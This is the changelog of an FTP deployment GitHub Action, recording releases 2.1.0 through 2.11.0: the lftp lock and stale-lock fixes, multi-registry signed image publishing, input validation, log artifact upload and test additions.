- **#121** (PR #129) — `lib.sh::acquire_lock_with_recovery` was masked-broken against real FTP servers. The function used the raw `quote MKD ${lock_path}` and `quote LIST -la .` lftp meta-commands; `lftp` 4.9.3 does not propagate 5xx replies from `quote` meta-commands into its own exit code, so a 550-on-duplicate-MKD was silently ignored and the script would happily report a successful acquire on a held lock. The stale-recovery LIST also returned empty because `quote LIST` does not negotiate PASV (vsftpd replies `425 Use PORT or PASV first`), so the recovery branch never saw the existing sentinel. v2.11.0 switches both to lftp's high-level commands — `mkdir` for the MKD and `cls` (alias for `ls`) for the listing — both of which propagate 5xx and negotiate PASV automatically. Two new integration scenarios (`09-concurrency-lock-e2e.sh`, `10-stale-lock-recovery.sh`) close the gap end-to-end against a real FTP server. The pre-existing bats unit tests (`tests/unit/lock.bats`) are updated to assert the new command strings.
- **`curl=8.21.0-r0` retired from alpine 3.24 (part of PR #123)** — the `Dockerfile` pin was failing `apk add` in the v2.11.0-cut CI integration job because alpine retired 8.21.0 from its 3.24 repos. Bumped to `curl=8.22.0-r0` (the version alpine 3.24 currently publishes). Verified end-to-end by the integration suite on a fresh `make build IMAGE=... VERSION=ci`.

### Documentation

- **README.md** ("Troubleshooting" table + new "Self-hosted runners" section, PR #128): a new row documents the `can't create /<some-path>/.netrc: Permission denied` symptom from #111, marks it as fixed in v2.11.0, and points users on older versions to the `env: HOME: /home/lftp` workaround. The new top-level "Self-hosted runners" subsection explains why self-hosted Linux runners work, why macOS / Windows don't, and what `HOME` forwarding meant before v2.11.0.
- **SECURITY.md** (new "Self-hosted runners" section, PR #128): explains the `HOME` inheritance threat model (#111), records the v2.11.0 fix, and lists the three concrete steps a self-hosted runner operator can take to verify no password reaches the host (`env: HOME: /home/lftp` pin, signed-tag verification, `make integration` end-to-end).

### Known limitations at v2.11.0

These are documented for transparency; they are NOT release blockers and there is no immediate plan to address them in v2.11.x. Users hitting them can open a separate sub-issue.

- **`INPUT_EXCLUDE_DELETE` is a no-op on `lftp` 4.9.3** — `lftp` does not recognise `set mirror:exclude-file` (it logs `mirror:exclude-file: no such variable` and moves on). Users who need "exclude these files from being deleted by mirror --delete" must keep a matching remote-only file list manually or pin `lftp` 4.9.4+ when available. The `tests/integration/scenarios/05-exclude-and-exclude-delete.sh` scenario asserts `INPUT_EXCLUDE` works but does NOT assert `INPUT_EXCLUDE_DELETE` does anything observable; that's the limit of what v2.11.0 can prove.
- **FTPS requires `INPUT_LFTP_SETTINGS="set ftp:ssl-force true;set net:persist-retries 0;"`** — `INPUT_FTP_SSL_ALLOW=true` alone permits SSL but does not initiate it on a plain `ftp://` URL in `lftp` 4.9.3, and the action's default `set net:persist-retries 5` interferes with `vsftpd` over TLS after the first MKD 550. The two FTPS integration scenarios set both knobs via `INPUT_LFTP_SETTINGS` to work around these `lftp` quirks. Users running the action against FTPS servers in production will hit the same workaround and should set `lftp_settings: "set ftp:ssl-force true;set net:persist-retries 0;"` in their workflow's `with:` block.
- **The FTPS integration scenarios use `alpine:3.23.3 + vsftpd`** (not `fauria/vsftpd`) — `fauria/vsftpd`'s wrapper script (`/usr/sbin/run-vsftpd.sh`) does not survive `docker-in-docker` on the GH-hosted runner (container exits within 30s without a listener). Alpine + `apk add vsftpd` with our own bootstrap is portable across `podman` local and CI `docker`. The plain-FTP scenarios continue using `fauria/vsftpd`.



## [2.10.0] - 2026-07-08

### Added

- **Multi-registry publishing for releases (LP-7)**. Every tag is
  now pushed to **three** OCI registries (when the corresponding
  secrets are present on the repo):

  | Registry | Image | How to consume |
  |---|---|---|
  | ghcr.io (always) | `ghcr.io/airvzxf/ftp-deployment-action:<tag>` | `uses: airvzxf/ftp-deployment-action@v2` |
  | Docker Hub (opt-in) | `docker.io/airvzxf/ftp-deployment-action:<tag>` | `uses: docker://docker.io/airvzxf/ftp-deployment-action@v2` |
  | AWS ECR Public (opt-in, OIDC) | `public.ecr.aws/m2z1h0m9/ftp-deployment-action:<tag>` | `uses: docker://public.ecr.aws/m2z1h0m9/ftp-deployment-action@v2` |

  The three registries receive the **same image bytes** from a
  single `docker buildx build` (identical OCI manifest digest),
  the **same** `cosign` keyless signature, and the **same**
  CycloneDX SBOM attestation attached via `actions/attest`.
  Docker Hub and ECR Public are **conditional on secrets
  presence** — if `DOCKERHUB_USERNAME`/`DOCKERHUB_TOKEN` or
  `AWS_ROLE_TO_ASSUME` are unset on the repo, the pipeline emits
  a `::notice::` and skips that registry, preserving the v2.9.0
  behaviour (ghcr.io only) bit-for-bit. The one-time setup for
  Docker Hub (PAT) and ECR Public (OIDC IAM role + trust
  policy) is documented in README §"Publishing targets".

  *AWS auth uses OIDC role assumption* (no static AWS access
  keys are stored in the repo): `aws-actions/configure-aws-credentials@v4`
  assumes the role from `AWS_ROLE_TO_ASSUME`, and
  `aws-actions/amazon-ecr-login@v2` performs the docker login
  to `public.ecr.aws` using the resulting session credentials.
  The IAM trust policy is pinned to `sub: repo:airvzxf/ftp-deployment-action:ref:refs/tags/v*`
  so only signed-tag pushes from this repo can assume it.

  The release pipeline (`release.yml`) changes are concentrated
  in two steps: the `meta` step now resolves `all_tags`,
  `dockerhub_enabled`, and `ecr_enabled` outputs based on secret
  presence, and `cosign sign` + `actions/attest` are now invoked
  once per enabled registry (ghcr.io is unconditional). The
  smoke test deliberately pulls from ghcr.io only — the three
  registries share one OCI manifest, so a ghcr.io failure
  implies the same failure on docker.io and public.ecr.aws.

### Documentation

- **README §"Publishing targets"** — new section listing the
  three registries, example `uses:` lines for each, and the
  one-time maintainer setup for Docker Hub (PAT + 2 secrets)
  and ECR Public (OIDC IAM role with a copy-pasteable trust
  policy JSON and the minimum ECR Public permission set).
- **README troubleshooting note** — a single new sentence
  pointing users who explicitly want to consume from Docker Hub
  or ECR Public at the `docker://` prefix pattern.


## [2.9.0] - 2026-07-08

### Added

- **Stale-lock auto-recovery for `concurrency_lock`** (closes the
  residual risk from v2.8.0 documented in the CHANGELOG entry for
  v2.8.0 and the `concurrency_lock` input description: "if the
  holder dies before RMD, subsequent runs will wait until
  `concurrency_lock_timeout` and then fail with exit 1"). When
  `concurrency_lock: "true"` is set, every successful acquire
  now writes a timestamp-encoded sentinel file at the FTP root
  (sibling of the lock dir, NOT inside it, so the release path
  can `quote RMD` without recursive delete). On a subsequent
  acquire, if MKD returns 550 (held), the action does
  `quote LIST -la .` to look for a sentinel; if the sentinel's
  timestamp is older than `concurrency_lock_timeout` seconds,
  the action takes over by `quote DELE`-ing the stale sentinel
  and `quote RMD`-ing the lock dir, then retrying MKD
  immediately. If the sentinel is recent, the action polls
  normally. If the lock dir exists but no sentinel is present
  (the previous holder died between MKD and the sentinel PUT),
  the action also takes over.

  ```yaml
  - uses: airvzxf/ftp-deployment-action@v2
    with:
      server: ${{ secrets.FTP_SERVER }}
      user: ${{ secrets.FTP_USERNAME }}
      password: ${{ secrets.FTP_PASSWORD }}
      concurrency_lock: "true"
      # Optional: tune the stale threshold (default 300s = 5 min).
      concurrency_lock_timeout: "300"
  ```

  The lock work moved out of the inline lftp `-e` script
  (v2.8.0) into shell-driven helpers in `lib.sh`
  (`acquire_lock_with_recovery`, `release_lock_safely`,
  `_lock_sentinel_name`, `_lock_age_seconds`,
  `_lock_parse_sentinel_listing`) so the LIST/parse/DELE/RMD
  sequence can branch on the stale detection result. The old
  `build_lock_acquire_script` and `build_lock_release_script`
  functions are kept as no-op shims for source-level backward
  compat. Default behaviour (lock disabled) is bit-for-bit
  identical to v2.8.0.

### Documentation

- **README: document the difference between plain FTP, implicit
  FTPS (`ftps://`, port 990, TLS from byte 0), and explicit
  FTPS (`ftp://` + `AUTH TLS`, port 21)**, and how they interact
  with the `ftp_ssl_allow` input. Closes PROPOSAL §5 #3 ("FTPS
  implícito vs. explícito sin documentar"). The new "Plain FTP
  vs FTPS" subsection in `Security and SSL` covers the four
  scheme × `ftp_ssl_allow` combinations, recommends the right
  `server` value for each hosting type, and explains the
  `ftps:initial-prot` escape hatch.
- **README: add two troubleshooting rows** covering the "wrong
  scheme" foot-gun (`getpeername: Connection refused` on
  `ftps://host:990` from a server that only speaks explicit
  FTPS on 21) and the legacy "PROT command not understood"
  fall-back (lftp drops the data connection on a non-PROT-P
  server). Both rows link back to the new subsection.

## [2.8.0] - 2026-07-07

### Added

- **Server-side concurrency lock to serialize concurrent
  deployments** (closes the risk from `PROPOSAL.md` §5 #6: "two
  simultaneous workflows to the same FTP can corrupt each
  other"). The default is OFF to preserve the v2.7.0
  behaviour bit-for-bit. Opt in with the new input
  `concurrency_lock: "true"`.

  ```yaml
  - uses: airvzxf/ftp-deployment-action@v2
    with:
      server: ${{ secrets.FTP_SERVER }}
      user: ${{ secrets.FTP_USERNAME }}
      password: ${{ secrets.FTP_PASSWORD }}
      concurrency_lock: "true"
  ```

  **Mechanism.** Before the mirror, lftp issues `quote MKD
  <path>` to create a sentinel directory on the FTP server.
  RFC 959 `MKD` and `RMD` are implemented by every FTP
  server (vsftpd, proftpd, Pure-FTPd, sftp-via-FTP-gateways,
  etc.) and `mkdir(2)` is atomic on virtually every UNIX-like
  filesystem (returning `EEXIST` if the directory already
  exists). The race window between two clients is
  microseconds, and the worst-case outcome — the lock
  briefly staying held by a dead runner — is caught by the
  configurable `concurrency_lock_timeout`. We chose
  `MKD`/`RMD` because lftp has no built-in server-side
  `lock` command (it only has `file:use-lock` for local
  files, which we verified against the lftp 4.9.3 source
  and the `src/commands.cc` static command table).

  **Inputs.**

  - `concurrency_lock` (default `false`) — opt-in switch.
  - `concurrency_lock_path` (default `.lftp-deployment.lock`)
    — sentinel directory; validated with the same
    `validate_path` rules as `local_dir` / `remote_dir`
    (rejects `..`, leading dash, control chars, and shell
    metacharacters).
  - `concurrency_lock_timeout` (default `300`) — maximum
    seconds to wait for the lock when another run is
    currently holding it. `0` means "fail immediately when
    held" (no polling).
  - `concurrency_lock_poll_interval` (default `5`) — seconds
    between `quote MKD` attempts. Rejected when `0` (would
    cause a division-by-zero in the iteration count).

  **Release.** The lock is released in three layered ways:
  (1) an inline `quote RMD <path>` in the lftp `-e` script
  right before `quit;`; (2) a fallback `run_lftp_lock_release`
  call in the EXIT trap (so a signal-killed lftp still
  releases the lock, using the .netrc that is also about to
  be removed); (3) the documentation in the README explains
  the manual `quote RMD` recovery path for the rare case of
  a stale lock (holder died before any of the above could
  run). When `concurrency_lock` is `false` (the default),
  `run_lftp_lock_release` short-circuits on an empty lock
  path and never invokes lftp, so the no-op path is bit-for-
  bit identical to v2.7.0.

  **When to use it.** For the common case of a single
  workflow deploying to one FTP, the **GitHub Actions
  `concurrency:` block** is the recommended approach
  (documented as Option A in the new README section "Concurrency /
  deployment lock") because it works across runners and
  regions, requires no extra inputs, and is platform-managed.
  The `concurrency_lock` input is the fallback for users who
  cannot add a `concurrency:` block (e.g. multiple distinct
  workflows pointing to the same FTP, or deploys driven by a
  tool the user does not own).

### Internal

- `lib.sh`: new functions `build_lock_acquire_script`,
  `build_lock_release_script`, and `run_lftp_lock_release`.
  All three read the new inputs via `_indirection` (the
  project's single point of dynamic variable-name lookup);
  no second `eval` site is introduced.
- `lib.sh`: `run_lftp_once` now takes two extra parameters
  (lock acquire / release fragments). When the lock is
  disabled, both are empty strings, so the composed
  lftp `-e` script is bit-for-bit identical to v2.7.0.
- `lib.sh`: `print_inputs_dump` now lists the four new
  inputs in both debug and non-debug modes.
- `entrypoint.sh`: the new inputs are defaulted to their
  `action.yml` defaults; `validate_path` /
  `validate_int` are run only when the lock is enabled,
  to keep the validation surface tight for the common
  case (`concurrency_lock=false`). The EXIT trap is
  extended to call `run_lftp_lock_release` before
  removing the .netrc (so lftp can still authenticate
  the release call).
- Tests: 11 new bats unit tests in `tests/unit/lock.bats`
  cover the empty/non-empty branches, the `timeout=0`
  short-circuit, the `ceil(timeout/poll)` iteration count
  for both 300/5 and 300/7, the lock path verbatim pass-
  through, and the no-op paths of `run_lftp_lock_release`.
  3 new smoke tests in `tests/smoke.sh` verify the
  default-off path emits no lock fragments in the lftp
  script, and that `..` in `concurrency_lock_path` and
  `0` in `concurrency_lock_poll_interval` are both
  rejected with exit 2.
- `tests/contract.sh` was unchanged: it auto-discovers the
  four new inputs from the new `lib.sh::print_inputs_dump`
  list and from the static `INPUT_*` references in
  `entrypoint.sh` / `lib.sh`, and matches them against
  `action.yml` (now 31 declared inputs).
- Total test count: 118 unit + 33 smoke + 1 contract + 3
  release-smoke = 155 tests, all green.

## [2.7.0] - 2026-07-06

### Added

- **Auto-upload lftp log to workflow artifact on failure**
  (closes the second TODO in `README.md`, the "attach logs to
  Workflow Artifacts" entry). A new input
  `upload_log_on_failure` (default `true`) controls the
  behaviour. When the action is about to exit 1, it POSTs the
  captured lftp log file to the current workflow run as an
  artifact named `ftp-deployment-action-log-<run-attempt>`, with
  a 90-day retention (the maximum allowed by the public
  GitHub REST API). To opt in, the user just needs to expose
  the token to the step:

  ```yaml
  - uses: airvzxf/ftp-deployment-action@v2
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    with:
      server: ${{ secrets.FTP_SERVER }}
      user: ${{ secrets.FTP_USERNAME }}
      password: ${{ secrets.FTP_PASSWORD }}
      local_dir: "./public_html"
  ```

  The function is fail-soft. If `GITHUB_TOKEN` (or any of
  `GITHUB_API_URL`, `GITHUB_REPOSITORY`, `GITHUB_RUN_ID`,
  `GITHUB_RUN_ATTEMPT`) is missing, the upload is skipped
  with a notice and the action still exits 1. If the upload
  request itself fails (network, 4xx, 5xx), a warning is
  printed and the action still exits 1. Set
  `upload_log_on_failure: "false"` to disable the upload
  entirely; the log file is always captured under
  `~/.lftp-logs/` in the container for the runner to inspect.

### Internal

- `Dockerfile`: `apk add` now also installs `curl=8.21.0-r0`
  (the current version in `alpine 3.24 main`). The image
  grows by ~200 KB; the trade-off is that no extra tool has
  to be downloaded at runtime.
- `lib.sh`: new function `upload_log_artifact LOG_FILE` in
  `lib.sh`. It uses `_indirection` (the project's single
  dynamic-variable-name-lookup helper) to read the GitHub-
  Actions env vars, so no second `eval` site is introduced.
  The Authorization header carries the token; it is never
  interpolated into the URL, so the token cannot leak into
  the runner log even if `curl -v` were used.
- `lib.sh`: `print_inputs_dump` now lists `upload_log_on_failure`
  in both debug and non-debug modes.
- `entrypoint.sh`: the new input is defaulted to empty
  (the `true` default lives in `action.yml`); the function
  is called only on the failure path (when `SUCCESS` is
  empty), between the lftp loop and the failure banner.
- `tests/unit/upload.bats`: 10 new unit tests covering the
  skip branches (opt-in disabled, each missing env var,
  missing log file) and the fail-soft behaviour (curl
  against an unreachable host, plus a sentinel-token leak
  check). The successful-upload path is not unit-tested
  (it requires network and a real `GITHUB_TOKEN`); it is
  covered manually by the README example.
- `tests/smoke.sh`: 2 new smoke tests. Test 29 confirms
  `upload_log_on_failure=false` skips the upload and
  shows the regular failure banner. Test 30 confirms the
  default (`true`) without `GITHUB_TOKEN` still fails
  gracefully with a notice.
- Contract test now sees 27 inputs (26 + 1 new) and passes
  unchanged.

[2.7.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.6.0...v2.7.0


## [2.6.0] - 2026-07-06

### Added

- **Pattern exclusion inputs** (`exclude` and `exclude_delete`).
  The `exclude` input takes a comma-separated list of glob
  patterns and translates to lftp's `mirror:exclude` setting
  (files matching the patterns are neither uploaded nor
  deleted). The `exclude_delete` input is independent and
  translates to lftp's `mirror:exclude-file` setting (files
  matching the patterns are protected from `--delete` but are
  still uploaded if present locally). Both inputs default to
  empty (no behaviour change for existing users). The same
  sanitization rules that apply to `lftp_settings` apply to
  these inputs (control chars, backtick, `$`, `!`, more than
  three `;`-chained directives are rejected; exit code `2` on
  violation). Example:

  ```yaml
  with:
    exclude: "*.map,node_modules/**,.git/**"
    exclude_delete: "*.log"
  ```

  Closes the first TODO in `README.md` (the "exclude delete
  files" entry). The second TODO (auto-upload the log as a
  workflow artifact) remains open and is targeted for a
  follow-up release.

### Internal

- `lib.sh`: `build_ftp_settings` now appends `set
  mirror:exclude <value>;` and `set mirror:exclude-file
  <value>;` after the 11 standard directives but before the
  `lftp_settings` free-form extension, so the user can still
  override via `lftp_settings` if needed.
- `lib.sh`: `print_inputs_dump` lists `exclude` and
  `exclude_delete` in both debug and non-debug modes.
- `entrypoint.sh`: 2 new `validate_lftp_settings` calls (one
  per input).
- `tests/unit/parse.bats`: 5 new unit tests covering the new
  injection paths (default empty, only `exclude`, only
  `exclude_delete`, both, override by `lftp_settings`).
- `tests/smoke.sh`: 4 new smoke tests (mirror:exclude
  injection, mirror:exclude-file injection, default empty,
  sanitization rejection). `run_init` is now variadic — it
  accepts any number of `KEY=value` env strings and a
  trailing numeric timeout, instead of a single concatenated
  string. The previous single-arg form is preserved for the
  existing 24 tests.
- Contract test now sees 26 inputs (24 + 2 new) and passes
  unchanged.

[2.6.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.5.0...v2.6.0


## [2.5.0] - 2026-07-06

### Added

- **bats unit tests for `lib.sh`** (5 files, 92 tests in
  `tests/unit/`). Each pure function in the library now has at
  least one happy-path and one reject-path test that runs in
  under 2 minutes without spinning up docker, alpine, or lftp.
  CI gets a new `unit` job that installs bats via `apt-get` and
  runs `bats tests/unit`. A `make unit` target is added for
  local iteration; it skips with a notice if bats is not
  installed.

### Changed

- **Architectural refactor (LP-1 / MP-5)**: split the previously
  monolithic `init.sh` (657 lines) into an orchestrator
  (`entrypoint.sh`, ~190 lines) and a library of pure functions
  (`lib.sh`, ~620 lines). The entrypoint sources the library and
  drives the workflow; the library contains every validation,
  parser, builder, retry helper, and reporting function. **Zero
  behaviour change** vs. v2.4.1 — the action still accepts the
  same inputs, produces the same exit codes, and the smoke tests
  pass unmodified apart from the path to the entrypoint.
- Deduplicate the 12 near-identical `if/else` branches that built
  `FTP_SETTINGS` into a single positional-parameter-driven loop in
  `build_ftp_settings` (lib.sh). Same keys, same defaults, same
  order.
- Replace the `eval "_cur=\${INPUT_${_v}-}"` indirection in the
  inputs dump with an explicit list of variable names plus a
  single `_indirection` helper in `lib.sh`. Dynamic variable-name
  lookup now happens in exactly one place in the entire codebase.
- `extract_netrc_host` now correctly handles the IPv6 form
  `[::1]:990` (bracketed host with a port suffix) in addition to
  `[::1]` (no port). The previous `\[*\])` glob required the
  value to end with `]`, which silently failed on
  `ftps://[::1]:990` and produced an empty string instead of
  `::1`. Caught by the new `extract_netrc_host: ftps://[::1]:990
  -> ::1` unit test.
- The contract test (`tests/contract.sh`) now greps both
  `entrypoint.sh` and `lib.sh` for `INPUT_*` references; the
  static and dynamic sets must still match the declared inputs in
  `action.yml`.

### Internal

- `Dockerfile`: `COPY entrypoint.sh lib.sh /app/`, `ENTRYPOINT
  ["/app/entrypoint.sh"]`.
- `Makefile`: `shellcheck -x entrypoint.sh lib.sh tests/contract.sh
  tests/smoke.sh`. The `-x` flag is required so shellcheck follows
  the `shellcheck source=lib.sh` directive in `entrypoint.sh`.
- `Makefile`: `make unit` target for the bats tests.
- `tests/smoke.sh`: `INIT_REL=./entrypoint.sh` (1-line path change
  in the harness; the test bodies are unchanged).
- `.github/workflows/ci.yml`: new `unit` job that installs bats
  and runs `bats tests/unit`; existing `shellcheck` job now
  covers `entrypoint.sh + lib.sh` and the `contract` job's name
  reflects the new contract test path.

[2.5.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.4.1...v2.5.0


## [2.4.1] - 2026-07-05

Hotfix. The v2.4.0 release was cut but its job setup failed:

  ##[error]Unable to resolve action
  `sigstore/cosign-installer@v4`, unable to find version `v4`

PR #62 (Dependabot) bumped from `@v3` to `@v4`, but the
sigstore/cosign-installer repo does not publish a floating
`v4` git ref.

### Fixed

- **release.yml** — pin `sigstore/cosign-installer` to
  `v4.1.2` (a specific version that exists).
- **dependabot.yml** — add a dedicated
  `actions-cosign-installer` group, separate from the
  catch-all `actions-others` group, so the next bump is a
  conscious decision rather than a silent major-version
  change that may or may not resolve.


## [2.4.0] - 2026-07-05

> Note: v2.4.0 was cut but the release pipeline failed at
> job setup (sigstore/cosign-installer@v4 is not a valid
> ref). No image was published for this tag. The fix is
> v2.4.1.

### Added

- **Release smoke test** (PR #63). The release pipeline now
  runs `tests/release-smoke.sh <just-pushed-image>` between
  *Build and push image* and *Generate SBOM (CycloneDX)*.
  The script pulls the just-pushed image from ghcr.io and
  runs three cheap checks (path-traversal validation,
  deprecation warning, `/app/VERSION` bake). Any failure
  aborts the release before SBOM / cosign run, so we never
  publish or sign a broken image. Catches the v2.3.0 class
  of failure (Dependabot alpine digest bump + unresolvable
  lftp pin) at the build step instead of at the cosign step.
  The same script is runnable locally via
  `make release-smoke IMAGE=<image>`.
- `Makefile` target `release-smoke` for local validation.

### Fixed

- **`init.sh` was not safe to invoke via direct `docker
  run`** (PR #63, bug found while writing the release smoke
  test). The *Inputs received* dump block accessed
  `${INPUT_*}` without a default-empty fallback. With
  `set -u` this is fine in production (the GitHub Actions
  runner always exports every declared input, even as
  empty string) but the moment the image is run outside
  GitHub Actions — exactly what the new smoke test does —
  the script dies on line 192 with *INPUT_DEBUG: parameter
  not set*. Fixed by a uniform block of POSIX
  parameter-expansion defaults at the top of the script.
  No change in the production code path; the fix makes
  the script safe in the new direct `docker run` case.
- **OCI license label** in `release.yml` was still
  `GPL-3.0` (from the original release pipeline) even
  though `LICENSE` was re-licensed to AGPL-3.0 in commit
  `f9bfc80`. Bumped to AGPL-3.0.

### Changed

- **Routine Dependabot bumps** (PRs #54, #55, #56, #57, #62):
  - `actions/checkout` v5 → v7 (PR #54).
  - `alpine` base image digest refresh, which moved
    3.23.3 → 3.24 (PR #55) and required a follow-up lftp
    pin bump to 4.9.3-r0 (PR #61, shipped as v2.3.1).
  - `docker/setup-buildx-action` v3 → v4,
    `docker/login-action` v3 → v4,
    `docker/build-push-action` v6 → v7 (PR #56).
  - `hadolint/hadolint-action` 3.1.0 → 3.3.0,
    `actions/download-artifact` v4 → v8 (PR #57).
  - `sigstore/cosign-installer` v3 → v4 (PR #62).

[2.4.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.3.1...v2.4.0
[2.3.1]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.3.0...v2.3.1

Hotfix. The v2.4.0 release was cut but its job setup failed:

  ##[error]Unable to resolve action
  `sigstore/cosign-installer@v4`, unable to find version `v4`

PR #62 (Dependabot) bumped from `@v3` to `@v4`, but the
sigstore/cosign-installer repo does not publish a floating
`v4` git ref.

### Fixed

- **release.yml** — pin `sigstore/cosign-installer` to
  `v4.1.2` (a specific version that exists).
- **dependabot.yml** — add a dedicated
  `actions-cosign-installer` group, separate from the
  catch-all `actions-others` group, so the next bump is a
  conscious decision rather than a silent major-version
  change that may or may not resolve.

[2.4.1]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.4.0...v2.4.1

## [2.3.1] - 2026-07-05

Hotfix. The v2.3.0 release was cut but its image build failed
because PR #55 (Dependabot alpine base image digest bump)
moved the base image from alpine 3.23.3 to alpine 3.24, and
the new alpine dropped `lftp=4.9.2-r9` (the only available
version is now `lftp=4.9.3-r0`).

### Fixed

- **Dockerfile** — bump the lftp pin from `4.9.2-r9` to
  `4.9.3-r0` to match the packages available in the new
  alpine 3.24 base image. `ca-certificates=20260611-r0`
  still resolves and is unchanged.

[2.3.1]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.3.0...v2.3.1

## [2.3.0] - 2026-07-05

Routine dependency bumps. No user-facing change.

### Changed

- **PR #54** — `actions/checkout` v5 → v7. The v7 release
  blocks checking out fork PRs from `pull_request_target`
  and `workflow_run` triggers (security improvement) and
  moves to ESM. Used in both CI and release workflows.
- **PR #55** — Alpine base image digest refreshed. The
  `lftp=4.9.2-r9` and `ca-certificates=20260611-r0` package
  pins are unchanged; the digest bump is a routine
  re-pin against the current `alpine:3.23.3` content.
- **PR #56** — `docker/setup-buildx-action` v3 → v4,
  `docker/login-action` v3 → v4, `docker/build-push-action`
  v6 → v7. All three move to Node 24 and require Actions
  Runner v2.327.1+ (well past the runner version on the
  default `ubuntu-latest` image at the time of writing).
  Used in the release workflow.
- **PR #57** — `hadolint/hadolint-action` 3.1.0 → 3.3.0
  (minor) and `actions/download-artifact` v4 → v8 (major).
  v8 of download-artifact makes hash mismatches an error
  by default (was a warning) and only unzips artifacts
  whose content-type indicates a zip; the release workflow's
  `anchore/sbom-action` output is a zip, so this is
  transparent for the SBOM attestation step.

[2.3.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.2.0...v2.3.0
[2.2.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.1.0...v2.2.0

## [2.2.0] - 2026-07-05

Four PRs on top of v2.1.0. No breaking change.

### Added

- **PR #52** (`feat(observability)`) — script hardening + log
  ergonomics:
  - Shebang is now `#!/bin/sh -eu` and the script enables
    `pipefail` immediately after. Catches silent typos in
    variable names (`set -u`) and a failing command in a
    pipeline (`pipefail`).
  - `::add-mask::` for `INPUT_PASSWORD`, `INPUT_USER` and
    `INPUT_SERVER` so even future log lines that echo the
    value will be redacted in the rendered log.
  - `::group::` / `::endgroup::` around the four heavy
    log phases (Inputs received, Resolved configuration,
    Upload, final result) so the GitHub Actions UI can
    collapse them.

- **PR #53** (`chore(devx)`) — developer-experience polish:
  - `.github/dependabot.yml` with weekly scans for both
    `docker` and `github-actions` ecosystems. lftp bumps are
    restricted to patches; actions are grouped per major.
  - ASCII flow diagram of `init.sh` added to the README.
  - `Makefile` with `lint`, `test`, `build`, `run`, `release`
    and `clean` targets (all no-op if the underlying tool
    is not installed).

- **PR #59** (`feat:`) — error classification and log
  capture:
  - Permanent lftp errors (530 login, 550 permission, 550
    no such file) are detected in the captured output and
    abort the retry loop early, saving minutes of waiting
    on a backoff that would never succeed.
  - Every lftp invocation's combined stdout+stderr is
    written to a timestamped log file at
    `~/.lftp-logs/run-<UTC>.log`. The path is exposed as
    the `log_file` action output (via `$GITHUB_OUTPUT`)
    so a follow-up step can attach it as a workflow
    artifact, and it is printed in the failure banner.

- **PR #60** (`feat:`) — `dry_run` input (default `false`).
  When set to `true`, the mirror command gets lftp's
  `--dry-run` flag, the plan is reported without any
  transfer or delete, and the final success banner switches
  to *FTP DRY RUN COMPLETED (no files transferred)* so a
  casual reader cannot mistake a dry run for a real upload.
  Long-standing TODO in the README.

### Changed

- **Relicense to AGPL-3.0** (commit `f9bfc80`). The
  project moves from GPL-3.0 to the GNU Affero General
  Public License v3.0 to add the network use clause
  (section 13 of the AGPL), ensuring the source remains
  available to users interacting with the software over a
  network. No code change; only `LICENSE` is updated.

[2.2.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.1.0...v2.2.0
[2.1.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.0.1...v2.1.0
[2.0.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v1.5.0...v2.0.0
[1.5.0]: https://github.com/airvzxf/ftp-deployment-action/releases/tag/v1.5.0
[2.9.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.8.0...v2.9.0
[2.10.0]: https://github.com/airvzxf/ftp-deployment-action/compare/v2.9.0...v2.10.0
[1.3.3]: https://github.com/airvzxf/ftp-deployment-action/releases/tag/v1.3.3

## [2.1.0] - 2026-07-05

Bundles three things: the release pipeline (already on `main`),
the digest pinning of the base image (also already on `main`
under `[Unreleased]`), and two follow-up PRs:

* **PR #50** (`fix(b02,b18)`) — quick wins + docs.
* **PR #51** (`feat:`) — deprecation warning for EOL / `@latest` /
  `@master` / older v1.x refs.

### Added

- **Deprecation warning** (PR #51). At the very start of `init.sh`,
  the action inspects `$GITHUB_ACTION_REF` and emits a
  `::warning::`, `::notice::`, or `::error::` workflow command:

  | Ref                          | Severity   | Reason                                                |
  |------------------------------|------------|-------------------------------------------------------|
  | `@latest`                    | `warning`  | moving target, pin to `@v2` or `@<sha>`               |
  | `@master` / `@main`          | `warning`  | development branch, use a tag                         |
  | v1.0-alpha.1, v1.0-alpha.2   | `warning`  | EOL (see SECURITY.md: only v1.4+ supported)          |
  | v1.1, v1.2.0                 | `warning`  | EOL                                                   |
  | v1.3.0 … v1.3.3              | `warning`  | EOL                                                   |
  | v1.4 … v1.9                  | `notice`   | v2 is available (BREAKING: `ssl_verify_certificate` default flipped to `true`) |
  | v2.x, anything not in the list | (silent) | current line                                          |

  The actual image version is baked into `/app/VERSION` at build
  time (`ARG VERSION=<tag>` from `release.yml`, default `dev` for
  local builds) and shown in the warning text.

  Strategy: hardcoded EOL list. No network call, no latency, no
  rate limit. Updated on each major-line cut (next cut: v3, when
  v2 becomes EOL).

- **`fail_on_deprecated` input** (PR #51, default `false`). When
  `true` and the ref is EOL, the warning is upgraded to
  `::error::` and the action exits 1. Other warnings stay
  advisory. Useful for orgs with a "no EOL versions" policy.

- **Troubleshooting section** in the README (PR #50). Five most
  common lftp errors (530, 550, TLS verify failed, connection
  refused, mirror access failed) with cause + fix in tabular form.

- **Header badges** in the README (PR #50): CI status, latest
  release, license.

- **`.github/workflows/release.yml`** (already on `main` under
  `[Unreleased]`): on every pushed `v*.*.*` tag (and via manual
  `workflow_dispatch` with a tag input), the workflow:
  - builds the Docker image with `docker/build-push-action@v6`
    using GitHub Actions cache (`type=gha`),
  - pushes the result to `ghcr.io/airvzxf/ftp-deployment-action`
    with tags `<version>` and `v<version>` plus OCI image labels
    (source, license, version),
  - generates a CycloneDX SBOM with `anchore/sbom-action@v0` and
    attaches it to the image as an in-toto attestation via
    `actions/attest@v4`,
  - signs the image with `cosign sign --yes` (keyless, OIDC).

- **CI and release workflows use `actions/checkout@v5`** (was v4).
  v5 targets Node 24, which silences the deprecation warning
  every push produced since Node 20 was deprecated on the GH
  Actions runners. No user-facing behaviour change.

### Fixed

